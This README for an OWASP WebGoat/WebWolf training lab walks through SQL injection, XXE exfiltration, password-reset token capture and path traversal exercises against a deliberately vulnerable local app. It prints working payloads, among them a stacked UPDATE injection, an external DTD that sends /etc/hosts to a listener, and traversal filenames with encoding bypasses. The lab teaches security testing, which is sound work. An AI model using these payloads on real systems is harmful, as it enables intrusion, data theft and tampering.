# OWASP WebGoat & WebWolf Lab

## Overview
**OWASP WebGoat** is a deliberately insecure web application maintained by OWASP, designed to teach common web application vulnerabilities (OWASP Top 10) in Java-based enterprise architectures. 

It runs alongside **WebWolf**, a companion attack-simulation server designed to emulate external attacker infrastructure: receiving HTTP callbacks, catching password-reset emails, hosting malicious files/DTDs, and testing Out-of-Band (OOB) vulnerabilities such as blind SSRF and XXE.

- **WebGoat URL**: `http://localhost:8099/WebGoat`
- **WebWolf URL**: `http://localhost:9090/WebWolf`
- **Container Name**: `cyberlab_web_webgoat`
- **Shortcut**: `./lab start webgoat`
- **Directory**: `Classes/02_web_penetration_tester/06_owasp_top_10/webgoat`

---

## Objectives & Core Learning Areas

1. **Authentication & Session Flaws**: Understand session fixation, token handling, and password reset poisoning.
2. **Injection Attacks**: Master SQL injection (in-band, blind, parameterized query internals) and command injection.
3. **XML External Entity (XXE) Injection**: Exploit vulnerable XML parsers to exfiltrate local files and trigger external network requests to WebWolf.
4. **Path Traversal & Insecure Uploads**: Bypass client/server input filters to traverse directories and overwrite arbitrary files.
5. **Out-of-Band (OOB) Exploitation**: Utilize WebWolf as an attacker listener to collect stolen tokens and capture external entity callbacks.

---

## Step-by-Step Exploit Exercises

### Exercise 1: Initial Setup & Account Registration
1. Start the lab:
   ```bash
   ./lab start webgoat
   ```
2. Open WebGoat at `http://localhost:8099/WebGoat` in your browser.
3. Click **Register new user** and create a user account (e.g., username `hacker`, password `password123`).
4. In another tab, open WebWolf at `http://localhost:9090/WebWolf` and log in with the exact same credentials created in WebGoat. WebWolf will automatically link your mailbox and incoming HTTP requests to your session.

---

### Exercise 2: SQL Injection (Advanced Queries & Bypasses)
1. In WebGoat, navigate to **Injection Flaws -> SQL Injection (advanced)**.
2. Observe the search query input intended to search for user accounts by name.
3. Test for SQL injection using a boolean condition:
   ```sql
   Smith' OR '1'='1
   ```
4. Perform statement chaining (stacked queries) to modify data:
   ```sql
   Smith'; UPDATE employees SET department='Executive' WHERE last_name='Smith';--
   ```
5. Extract confidential information using `UNION SELECT` to enumerate columns and table schemas from the underlying HSQLDB database.

---

### Exercise 3: XML External Entity (XXE) Exfiltration with WebWolf
1. Navigate to **XXE -> Exfiltrating data via XXE**.
2. Intercept the comment submission request in Burp Suite. The endpoint accepts XML:
   ```xml
   <?xml version="1.0"?>
   <comment>
     <text>Sample comment</text>
   </comment>
   ```
3. In WebWolf (`http://localhost:9090/WebWolf`), go to the **File Upload** section and upload an external DTD named `attack.dtd` containing:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/hosts">
   <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://localhost:9090/landing?token=%file;'>">
   %eval;
   %exfiltrate;
   ```
4. In Burp Suite, inject an external entity referencing WebWolf's hosted DTD:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE comment SYSTEM "http://localhost:9090/files/hacker/attack.dtd">
   <comment>
     <text>Trigger XXE</text>
   </comment>
   ```
5. Check the **Incoming Requests** panel in WebWolf. Observe the HTTP GET request sent by WebGoat containing the exfiltrated content of `/etc/hosts` in the query parameter.

---

### Exercise 4: Password Reset Flaw (Token Hijacking via WebWolf)
1. Navigate to **Authentication Flaws -> Password Reset**.
2. Notice the password reset mechanism asks for a username and sends a reset link to the user's registered email address.
3. In WebWolf, click on **Incoming Emails**.
4. Trigger the password reset for the target account or use your registered username.
5. Switch to WebWolf, locate the incoming email containing the password reset token, and submit the extracted token in WebGoat to complete the challenge.

---

### Exercise 5: Path Traversal (Arbitrary File Upload Bypass)
1. Navigate to **Path Traversal -> Profile Upload**.
2. Attempt to upload a profile picture. Intercept the multipart request in Burp Suite.
3. Observe the `filename` parameter in the `Content-Disposition` header:
   ```http
   Content-Disposition: form-data; name="uploadedFile"; filename="avatar.jpg"
   ```
4. Modify the filename to traverse out of the intended uploads directory:
   ```http
   Content-Disposition: form-data; name="uploadedFile"; filename="../test.txt"
   ```
   If the application strips simple `../`, test URL-encoding (`%2e%2e%2f`) or nested traversal sequences (`....//`).
5. Submit the payload to successfully place the file in an unauthorized parent directory.

---

## YouTube Walkthroughs & Solving Guides

- [OWASP WebGoat 8 - For Beginners](https://www.youtube.com/watch?v=33VZ7RvMkgM)
- [How to install WebGoat](https://www.youtube.com/watch?v=gxID0acwBgc)
- [How to install WebWolf](https://www.youtube.com/watch?v=dff4SROag0w)
- [WebGoat 8 XXE (XML External Entities) Walkthrough](https://www.youtube.com/watch?v=eHawcxE9f_8)
- [Session Hijacking & Token Manipulation - WebGoat](https://www.youtube.com/watch?v=YO8rsCMVUyY)

---

## Quick CLI Control
From the `cyber_lab` root directory:
```bash
# Start WebGoat & WebWolf
./lab start webgoat

# Inspect container status
./lab status

# Connect to container shell
./lab shell webgoat

# Stop the lab
./lab stop webgoat
```
